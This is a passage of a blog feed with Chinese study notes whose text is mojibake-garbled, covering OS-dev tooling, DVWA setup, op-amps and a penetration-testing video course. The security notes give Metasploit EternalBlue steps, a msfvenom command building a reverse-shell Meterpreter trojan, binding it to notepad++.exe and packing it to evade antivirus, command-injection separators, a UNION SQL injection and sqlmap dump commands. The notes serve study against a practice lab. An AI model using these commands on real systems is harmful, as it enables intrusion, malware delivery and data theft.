    <link href="/2022/12/17/30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-Linux-%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/12/17/30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-Linux-%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/zchrissirhcz/osask-linux">å‚è€ƒ Github</a></p><h1 id="ä½¿ç”¨çš„å·¥å…·"><a href="#ä½¿ç”¨çš„å·¥å…·" class="headerlink" title="ä½¿ç”¨çš„å·¥å…·"></a>ä½¿ç”¨çš„å·¥å…·</h1><ul><li>nasm</li><li>dd</li><li>qemu</li></ul><h2 id="nasm"><a href="#nasm" class="headerlink" title="nasm"></a>nasm</h2><p>nasm ç”¨æ¥ç¼–è¯‘æ±‡ç¼–ä»£ç åˆ°ç›®æ ‡æ–‡ä»¶. å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nasm test.nas -o <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h2 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h2><p>dd ç”¨æ¥åˆ¶ä½œè½¯ç›˜.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=<span class="hljs-built_in">test</span> of=test.img count=1 bs=512<br>$ <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=test.img bs=512 seek=1 skip=1 count=2879<br></code></pre></td></tr></table></figure><p><code>bs=512</code> å…¶å®æ˜¯é»˜è®¤å€¼. <code>count</code> è¡¨ç¤ºè¦ä» input file å¤åˆ¶çš„ block æ•°, block çš„å¤§å°å–å†³äº <code>bs</code> è®¾å®šçš„å€¼, é»˜è®¤ä¸º 512, <code>bs</code> å°±æ˜¯ bytes, è¡¨ç¤ºä¸€æ¬¡è¯»å†™çš„ bytes æ•°.</p><p>ç¬¬ä¸€æ¡å‘½ä»¤æ˜¯å°†ç›®æ ‡æ–‡ä»¶çš„å†…å®¹å¤åˆ¶åˆ°è½¯ç›˜ä¸­.</p><p>ç¬¬äºŒæ¡å‘½ä»¤ä¸­ <code>/dev/zero</code>, å…¶æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶, æä¾›è¶³å¤Ÿå¤šçš„ç©ºå­—ç¬¦ (null characters), ç”¨æ¥åˆå§‹åŒ–ä¸€ä¸ªæ•°æ®å­˜å‚¨ç©ºé—´. <code>seek=1</code> è¡¨ç¤ºä»è¾“å‡ºæ–‡ä»¶çš„ç¬¬äºŒä¸ª block å¼€å§‹å†™å…¥. <code>skip=1</code> è¡¨ç¤ºä»è¾“å…¥æ–‡ä»¶çš„ç¬¬äºŒä¸ª block å¼€å§‹è¯»å–, <code>count=2879</code> è¡¨ç¤ºè¦å¤åˆ¶çš„ block æ•°. ç”±äºç¬¬ä¸€æ¡å‘½ä»¤åªå†™å…¥äº† 1 ä¸ª block, å› æ­¤è¿™é‡Œç›¸å½“äºæ¸…ç©ºåé¢çš„ block.</p><h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><p>qemu ç”¨æ¥å¯åŠ¨è™šæ‹Ÿæœº. å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -drive file=test.img,<span class="hljs-keyword">if</span>=floppy<br></code></pre></td></tr></table></figure><p>çœ‹ <code>man qemu-system-x86_64</code> è¯´ <code>-drive</code> æ˜¯å®šä¹‰ä¸€ä¸ª driver, file ç”¨æ¥æŒ‡å®šæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å®šä¹‰å“ªä¸€ä¸ª disk çš„ driver, <code>if=flopy</code> è¡¨ç¤ºæ˜¯ä¸€ä¸ªè½¯ç›˜. ä½†ä¼¼ä¹ä¹Ÿå¯ä»¥ç”¨æ¥å¯åŠ¨.</p>]]></content>
    
    
    <categories>
      
      <category>Operate System</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¯†ç ç ´è§£-B-ç«™æ•™ç¨‹</title>
    <link href="/2022/12/15/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-B-%E7%AB%99%E6%95%99%E7%A8%8B/"/>
    <url>/2022/12/15/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-B-%E7%AB%99%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1a44y1X7UL/?spm_id_from=333.788.recommend_more_video.3&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>å®‰è£… JAVA, éœ€è¦ä½¿ç”¨ Burp Suite è¿™ä¸ªå·¥å…·. (å…¶æ˜¯ä¸€ä¸ªæŠ“åŒ…å·¥å…·) å…¶å¯ä»¥æ§åˆ¶æµé‡çš„é€šè¡Œ.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA-ç¯å¢ƒæ­å»º</title>
    <link href="/2022/12/15/DVWA-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/12/15/DVWA-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ docker æ­å»ºå³å¯:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -it -p 10012:80 vulnerables/web-dvwa<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨å®¿ä¸»æœºæµè§ˆå™¨ä¸Šè®¿é—® <code>127.0.0.1:10012</code> å³å¯è¿›å…¥é¡µé¢ï¼Œé¦–å…ˆéœ€è¦ reset database, ä¹‹åé»˜è®¤ç”¨æˆ·åä¸º <code>admin</code>, é»˜è®¤å¯†ç ä¸º <code>password</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œå®‰å…¨-B-ç«™æ•™ç¨‹</title>
    <link href="/2022/12/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-B-%E7%AB%99%E6%95%99%E7%A8%8B/"/>
    <url>/2022/12/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-B-%E7%AB%99%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1KM411z7pa/?p=2&spm_id_from=pageDriver&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><p><a href="https://www.kali.org/tools">Kali å®˜ç½‘</a></p><h1 id="P3-metasploit-æ˜¯ä»€ä¹ˆ"><a href="#P3-metasploit-æ˜¯ä»€ä¹ˆ" class="headerlink" title="P3 metasploit æ˜¯ä»€ä¹ˆ"></a>P3 metasploit æ˜¯ä»€ä¹ˆ</h1><p>metasploit æ˜¯ä¸€ä¸ªæ”»å‡»è½¯ä»¶ (ç®€ç§° msf)ï¼Œå¯ä»¥æ”»å‡»å¸¸è§çš„ç½‘ç«™ï¼Œæ“ä½œç³»ç»Ÿ. å…¶æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¼æ´åˆ©ç”¨å’Œæµ‹è¯•å·¥å…·ï¼Œé›†æˆäº†å„ç§å¹³å°ä¸Šå¸¸è§çš„æº¢å‡ºæ¼æ´å’Œæµè¡Œçš„ shellcode.</p><p>åœ¨ kali ä¸­å®‰è£…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt install metasploit-framework<br></code></pre></td></tr></table></figure><p>å¯åŠ¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ msfconsole<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ³•åˆ™:</p><ol><li>ä½¿ç”¨æ¨¡å—</li><li>é…ç½®æ¨¡å—å¿…é€‰é¡¹</li><li>è¿è¡Œæ¨¡å—</li></ol><h2 id="åˆ©ç”¨æ°¸æ’ä¹‹è“æ¼æ´"><a href="#åˆ©ç”¨æ°¸æ’ä¹‹è“æ¼æ´" class="headerlink" title="åˆ©ç”¨æ°¸æ’ä¹‹è“æ¼æ´"></a>åˆ©ç”¨æ°¸æ’ä¹‹è“æ¼æ´</h2><p>åœ¨è¿›å…¥ metasploit ç•Œé¢åæœç´¢:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msf6 &gt; search ms17_010<br></code></pre></td></tr></table></figure><p><code>ms17_010</code> çš„å«ä¹‰æ˜¯ï¼Œ Microsoft 17 å¹´çš„ç¬¬ 10 å·æ¼æ´.</p><p>ä½¿ç”¨æ¨¡å—ï¼Œç”¨ <code>use</code> å‘½ä»¤åŠ æ¨¡å—å, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure><p>æˆ–åŠ ç¼–å·:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msf6 &gt; use 0<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹é…ç½®:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msf6 &gt; show options<br></code></pre></td></tr></table></figure><p>åœ¨æ·»åŠ äº†ä¸€ä¸ªæ¨¡å—åæŸ¥çœ‹é…ç½®ï¼Œåœ¨ <code>Required</code> æ ä¸­ä¸º <code>yes</code> åˆ™æ˜¯å¿…é¡»æ·»åŠ çš„é…ç½®. è‹¥æ²¡æœ‰é»˜è®¤è®¾ç½®åˆ™éœ€è¦è‡ªå·±è®¾ç½®.</p><p><code>payload options</code> æ˜¯æ”»å‡»çš„ç›®çš„ï¼Œå¦‚è·å– metarpreter.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">&gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>è‹¥æƒ³è·å– Linux&#x2F;macOS ç³»ç»Ÿ, ä¿®æ”¹ windows å³å¯.</p><p>ä¿®æ”¹é…ç½®ç”¨ <code>set</code> å‘½ä»¤, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">&gt; <span class="hljs-built_in">set</span> lport 10001<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ¨¡å—, ä½¿ç”¨ <code>run</code> å‘½ä»¤: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">&gt; run<br></code></pre></td></tr></table></figure><p>å‡ºç° <code>meterpreter</code> æç¤ºæ¡†è¡¨ç¤ºæ”»å‡»æˆåŠŸ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">meterpreter &gt; <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h1 id="P6-metasploitæ”»å‡»æˆåŠŸåèƒ½åšä»€ä¹ˆ"><a href="#P6-metasploitæ”»å‡»æˆåŠŸåèƒ½åšä»€ä¹ˆ" class="headerlink" title="P6 metasploitæ”»å‡»æˆåŠŸåèƒ½åšä»€ä¹ˆ"></a>P6 metasploitæ”»å‡»æˆåŠŸåèƒ½åšä»€ä¹ˆ</h1><p>ä½¿ç”¨ Kali æ¸—é€å·¥å…·ç”Ÿæˆè¿œæ§æœ¨é©¬</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.123.136 lport=9999 -f exe -o demo.exe<br></code></pre></td></tr></table></figure><p><code>-p</code> è¡¨ç¤º payload. <code>-f</code> è¡¨ç¤º format.</p><p>è¿™æ˜¯åœ¨æœ¬åœ°ç”Ÿæˆä¸€ä¸ªæœ¨é©¬æ–‡ä»¶, ä¹‹åéœ€è¦å°†è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº.</p><p>æ”»å‡»ä¹‹å‰éœ€è¦è¿›å…¥ <code>msfconsole</code> ä½¿ç”¨ä¸€ä¸ªæ¨¡å—, ç”¨äºå¼€å¯ç›‘å¬:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br></code></pre></td></tr></table></figure><p>ä¹‹å show è®¾ç½®ï¼Œset ä¸€äº›è®¾ç½®, æœ€å run. å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">&gt; use exploit/multi/handler<br>&gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>&gt; <span class="hljs-built_in">set</span> lhost 192.168.123.136<br>&gt; <span class="hljs-built_in">set</span> lport 9999<br>&gt; run<br></code></pre></td></tr></table></figure><h2 id="èº²é¿æ€æ¯’è½¯ä»¶"><a href="#èº²é¿æ€æ¯’è½¯ä»¶" class="headerlink" title="èº²é¿æ€æ¯’è½¯ä»¶"></a>èº²é¿æ€æ¯’è½¯ä»¶</h2><h3 id="æ†ç»‘åœ¨å…¶ä»–è½¯ä»¶ä¸Š"><a href="#æ†ç»‘åœ¨å…¶ä»–è½¯ä»¶ä¸Š" class="headerlink" title="æ†ç»‘åœ¨å…¶ä»–è½¯ä»¶ä¸Š"></a>æ†ç»‘åœ¨å…¶ä»–è½¯ä»¶ä¸Š</h3><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.123.136 lport=9999 -f exe -o demo.exe -x notepad++.exe -o notepad++.exe<br></code></pre></td></tr></table></figure><p><code>-x</code> ç”¨äºæŒ‡å®šä¸€ä¸ªæ¨¡æ¿ï¼Œè¡¨æ˜é™„åŠ åˆ°å“ªä¸€ä¸ªæ­£å¸¸ç¨‹åºä¹‹å.</p><h3 id="åŠ å£³"><a href="#åŠ å£³" class="headerlink" title="åŠ å£³"></a>åŠ å£³</h3><p>æŠŠç¨‹åºåŠ å¯†æˆ–å‹ç¼©ï¼Œä¸”é¿å…åç¼–è¯‘. å¦‚ä½¿ç”¨ Themida.</p><h1 id="P9-å¸¸è§çš„ç½‘ç«™æ¼æ´"><a href="#P9-å¸¸è§çš„ç½‘ç«™æ¼æ´" class="headerlink" title="P9 å¸¸è§çš„ç½‘ç«™æ¼æ´"></a>P9 å¸¸è§çš„ç½‘ç«™æ¼æ´</h1><p>OWASP ç»„ç»‡ï¼Œæ¯å¹´ä¼šå…¬å¸ƒ web åº”ç”¨çš„å¨èƒå®‰å…¨æŠ¥å‘Š.</p><h1 id="P10-å…­æ­¥æ­å»ºDVWA"><a href="#P10-å…­æ­¥æ­å»ºDVWA" class="headerlink" title="P10 å…­æ­¥æ­å»ºDVWA"></a>P10 å…­æ­¥æ­å»ºDVWA</h1><p>DVWA æ˜¯ OWASP å®˜æ–¹ç¼–å†™çš„ PHP ç½‘ç«™ï¼ŒåŒ…å«äº†å„ç§ç½‘ç«™å¸¸è§æ¼æ´ï¼Œå¯ä»¥å­¦ä¹ æ”»å‡»åŠä¿®å¤æ–¹å¼.</p><p><a href="https://github.com/digininja/DVWA/archive/master.zip">DVWA æºç åœ°å€</a></p><p><img src="/../img/steps_to_build_DVWA.png"></p><h1 id="P11-å±å®³å·¨å¤§æ¼æ´-å‘½ä»¤æ‰§è¡Œ"><a href="#P11-å±å®³å·¨å¤§æ¼æ´-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="P11 å±å®³å·¨å¤§æ¼æ´-å‘½ä»¤æ‰§è¡Œ"></a>P11 å±å®³å·¨å¤§æ¼æ´-å‘½ä»¤æ‰§è¡Œ</h1><p>è¿™ç§æ¼æ´ä¸€èˆ¬å‡ºç°äºï¼Œåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£ï¼Œå¦‚ä¸€äº›è®¾å¤‡çš„ web ç®¡ç†ç•Œé¢. è‹¥æ²¡æœ‰ä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤è€Œå·²å‘½ä»¤ï¼Œè®©åå°æ‰§è¡Œï¼Œä»è€Œè·å¾—åå°æœåŠ¡å™¨æƒé™.</p><p>è‹¥æœ‰ä¸€ä¸ªç•Œé¢ç”¨äºæµ‹è¯• <code>ping</code>, å¦‚:</p><p><img src="/../img/web_security_test_ping.png"></p><p>è¿™ç›¸å½“äºæ˜¯å¯ä»¥è¾“å…¥ä¸€è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆ:</p><ul><li><code>127.0.0.1 &amp; cmd</code></li><li><code>127.0.0.1 &amp;&amp; cmd</code></li><li><code>127.0.0.1 | cmd</code></li><li><code>127.0.0.1 || cmd</code></li><li><code>127.0.0.1 ; cmd</code></li></ul><p>ç­‰å½¢å¼çš„å‘½ä»¤éƒ½æœ‰å¯èƒ½æ‰§è¡Œ.</p><p>php çš„ <code>shell_exec</code> å‡½æ•°ï¼Œé€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ã€‚å¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›.</p><p><mark>é˜²å¾¡ command injection</mark>  è¦æ³¨æ„ï¼Œ <mark>è¿‡æ»¤å‘½ä»¤è¿æ¥ç¬¦</mark> .</p><p><mark>æ¸—é€æµ‹è¯•è§£å†³åŠæ³•</mark> :</p><ul><li>ç™½ç›’æµ‹è¯•, å¯ä»¥çœ‹åˆ°æºä»£ç , æŸ¥çœ‹æºä»£ç è¿‡æ»¤æœºåˆ¶</li><li>é»‘ç›’æµ‹è¯•, çœ‹ä¸åˆ°æºä»£ç , ä¾æ¬¡å°è¯•å¸¸è§å‘½ä»¤è¿æ¥ç¬¦</li></ul><p>æ³¨æ„ï¼Œæœ‰äº›è¢«è¿‡æ»¤çš„è¿æ¥ç¬¦æ˜¯ <mark>è¿æ¥ç¬¦+ç©ºæ ¼</mark> , å› æ­¤å¯ä»¥å°è¯•æ²¡æœ‰åŠ ç©ºæ ¼çš„å½¢å¼.</p><p><mark><code>impossible</code> é˜²å¾¡</mark> ç›´æ¥åˆ¤æ–­ IP åœ°å€.</p><h1 id="SQLæ³¨å…¥æ¼æ´"><a href="#SQLæ³¨å…¥æ¼æ´" class="headerlink" title="SQLæ³¨å…¥æ¼æ´"></a>SQLæ³¨å…¥æ¼æ´</h1><p>SQL æ˜¯ Structured Query Language ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€.</p><p>SQL æ³¨å…¥ (SQL injection), æ˜¯åœ¨è¾“å…¥çš„å­—ç¬¦ä¸²ä¹‹ä¸­æ³¨å…¥ SQL æŒ‡ä»¤ï¼Œåœ¨è®¾è®¡ä¸è‰¯çš„ç¨‹åºå½“ä¸­å¿½ç•¥äº†å­—ç¬¦æ£€æŸ¥, é‚£ä¹ˆè¿™äº›æ³¨å…¥è¿›å»çš„æ¶æ„æŒ‡ä»¤å°±ä¼šè¢«æ•°æ®åº“æœåŠ¡å™¨è¯¯è®¤ä¸ºæ˜¯æ­£å¸¸çš„ SQL æŒ‡ä»¤è€Œè¿è¡Œ.</p><p>å¯ä»¥ç®€å•ç†è§£ä¸ºï¼Œèƒ½æ”¹å˜åŸæœ‰ SQL è¯­å¥çš„æ¼æ´å°±æ˜¯ SQL æ³¨å…¥.</p><p>åˆ©ç”¨ <code>order by</code> è¯­å¥åˆ¤æ–­æ•°æ®åº“çš„åˆ—æ•°.</p><p>å‡ ä¸ª MySQL çš„å†…ç½®å‡½æ•°:</p><ul><li><code>user()</code>: è¿”å›å½“å‰æ•°æ®åº“è¿æ¥ç”¨æˆ·</li><li><code>database()</code>: è¿”å›å½“å‰æ•°æ®åº“åç§°</li></ul><p>æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨ä¿¡æ¯:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> table_name,table_schema <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;dvwa&#x27;</span>#<br></code></pre></td></tr></table></figure><p><code>information_schema</code> æ˜¯ä¸€ä¸ªå†…ç½®ä¿¡æ¯.</p><h2 id="SQLmap-ä½¿ç”¨"><a href="#SQLmap-ä½¿ç”¨" class="headerlink" title="SQLmap ä½¿ç”¨"></a>SQLmap ä½¿ç”¨</h2><p>ç”¨ä¸€ä¸ª python è„šæœ¬è‡ªåŠ¨æ£€æµ‹æœ‰æ—  SQL æ³¨å…¥æ¼æ´.</p><p><a href="https://github.com/sqlmapproject/sqlmap">SQLmap çš„ Github åœ°å€</a>.</p><p>ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ python sqlmap.py -u <span class="hljs-string">&quot;http://...&quot;</span> --cookie=<span class="hljs-string">&#x27;...&#x27;</span><br></code></pre></td></tr></table></figure><p><code>-u</code> å‚æ•°ä¸º url, å³ä½ æƒ³è¦æ£€æµ‹çš„åœ°å€, <code>--cookie</code> ç”¨äºè¿™ä¸ªç½‘ç«™éœ€è¦ç™»é™†æ—¶ï¼Œåœ¨å¼€å‘è€…æ¨¡å¼ä¸­å¯è·å–.</p><p>å¦‚æœ‰ <code>--dbs</code> å‚æ•°ï¼Œå³ database server, ç”¨äºè·å–æ‰€æœ‰æ•°æ®åº“å.</p><p><mark>è·å–æŒ‡å®šæ•°æ®åº“è¡¨</mark>, ç”¨ <code>-D</code> å³ data æ¥æŒ‡å®šæƒ³è¦è·å–çš„æ•°æ®åº“åï¼Œ<code>--tables</code> æ¥åˆ—å‡ºæ•°æ®åº“è¡¨. å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ python sqlmap.py -u <span class="hljs-string">&quot;http://...&quot;</span> --cookie=<span class="hljs-string">&#x27;...&#x27;</span> -D dvwa --tables<br></code></pre></td></tr></table></figure><p><mark>è·å–è¡¨ä¸­çš„æ•°æ®</mark> å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ python sqlmap.py -u <span class="hljs-string">&quot;http://...&quot;</span> --cookie=<span class="hljs-string">&#x27;...&#x27;</span> -D dvwa -T <span class="hljs-built_in">users</span> --columns<br></code></pre></td></tr></table></figure><p><code>-T</code> å‚æ•°æ˜¯æŒ‡å®šæƒ³è¦è·å–çš„è¡¨åä¸º <code>users</code>, <code>--columns</code> è¡¨ç¤ºåˆ—å‡ºè¡¨é¡¹. è‹¥æ˜¯è¯»å–å…¨éƒ¨æ•°æ®ï¼Œå°† <code>--columns</code> æ¢æˆ <code>--dump</code></p><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><p>è¿‡æ»¤ç”¨æˆ·è¾“å…¥å†…å®¹ï¼Œä¸è®©è¾“å…¥ sql è¯­å¥. å¦‚å°†ç‰¹æ®Šç¬¦å·æ›¿æ¢ä¸ºç©ºï¼Œæˆ–åˆ¤æ–­ç”¨æˆ·è¾“å…¥ SQL è¯­å¥å°±ç»ˆæ­¢æ‰§è¡Œ.</p><p><code>impossible</code> é˜²å¾¡ï¼Œå€Ÿç”¨ PDO (PHP Data Objects) é…åˆæ­£ç¡®çš„è¿‡æ»¤å’Œ SQL è¯­å¥æ¥é¿å… SQL æ³¨å…¥.</p><p><img src="/../img/impossible_of_SQL_injection.png"></p><h1 id="P21-æ”¶é›†ç›®æ ‡ä¿¡æ¯-è¿›è¡Œç«¯å£æ‰«æ"><a href="#P21-æ”¶é›†ç›®æ ‡ä¿¡æ¯-è¿›è¡Œç«¯å£æ‰«æ" class="headerlink" title="P21 æ”¶é›†ç›®æ ‡ä¿¡æ¯-è¿›è¡Œç«¯å£æ‰«æ"></a>P21 æ”¶é›†ç›®æ ‡ä¿¡æ¯-è¿›è¡Œç«¯å£æ‰«æ</h1><p><mark>ä½œç”¨</mark>: å‘ç°ç›®æ ‡ä¸»æœºçš„ç«¯å£åŠå…¶å¯¹åº”å¼€æ”¾çš„æœåŠ¡, æ”»å‡»è€…é€šè¿‡å‘ç°åŠåˆ©ç”¨æœåŠ¡æ‰€å­˜åœ¨çš„æ¼æ´, å…¥ä¾µç›®æ ‡ä¸»æœº.</p><p>ä½¿ç”¨å·¥å…·:</p><ul><li>zenmap </li><li>railgun</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è¿ç®—æ”¾å¤§å™¨çš„è´Ÿåé¦ˆ</title>
    <link href="/2022/12/12/%E8%BF%90%E7%AE%97%E6%94%BE%E5%A4%A7%E5%99%A8%E7%9A%84%E8%B4%9F%E5%8F%8D%E9%A6%88/"/>
    <url>/2022/12/12/%E8%BF%90%E7%AE%97%E6%94%BE%E5%A4%A7%E5%99%A8%E7%9A%84%E8%B4%9F%E5%8F%8D%E9%A6%88/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1pT4y1M7QP/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><p>è¿™å¼ å›¾å¾ˆå¥½è¯´æ˜:</p><p><img src="/../img/vitual_ground.png"></p><p>ä¸ºä»€ä¹ˆè¯´æ˜¯ <mark>virtual ground</mark>?</p><p>å› ä¸º $V_2$ æ¥åœ°ï¼Œ $V_1 &#x3D; V_2$, å› æ­¤å¥½åƒ $V_1$ ä¹Ÿæ¥åœ°.</p><p>ä¹Ÿå¯ä»¥ç§°ä¸º ,<mark>virtual short</mark> è¿˜æ˜¯å› ä¸º $V_1 &#x3D; V_2$, ç”µä½ç›¸åŒï¼Œå°±å¥½åƒçŸ­è·¯.</p><p><mark>virtual break</mark> æŒ‡çš„æ˜¯æ”¾å¤§å™¨è¾“å…¥é˜»æŠ—æ— ç©·å¤§ï¼Œè¾“å…¥ç”µæµç›¸å½“äº 0, ä¹Ÿå°±æ˜¯æ–­è·¯.</p><p>æ­¤æ—¶ï¼Œç”µæµçš„æµå‘ä¸º:</p><p><img src="/../img/direction_of_input_current.png"></p><p>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬è¯´çš„ç”µå‹éƒ½æœ‰ä¸€ä¸ªé»˜è®¤çš„å‚è€ƒç‚¹ï¼Œä¸€èˆ¬æ˜¯ â€œåœ°â€ ä¸º 0V.</p><p>è€Œè¿™é‡Œçš„è¾“å‡ºç”µå‹æ”¹ä»¥ $v_1$ ä½œä¸ºå‚è€ƒç‚¹ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªåæ–¹å‘çš„ç”µæµï¼Œå…¶å’Œ $i$ å¤§å°ç›¸ç­‰ï¼Œæ–¹å‘ç›¸å:</p><p><img src="/../img/final_pic_virtual_break.png"></p><p>è¿™é‡Œæœ‰å‡ ä¸ªç–‘æƒ‘çš„ç‚¹:</p><ul><li>ä¸ºä»€ä¹ˆ $i \ne \frac{V_i}{R_1 + R_2}$</li><li>$R_2$ æ‰€åœ¨æ”¯è·¯ä¸Šè¿˜æœ‰ç”µæµå—</li></ul>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
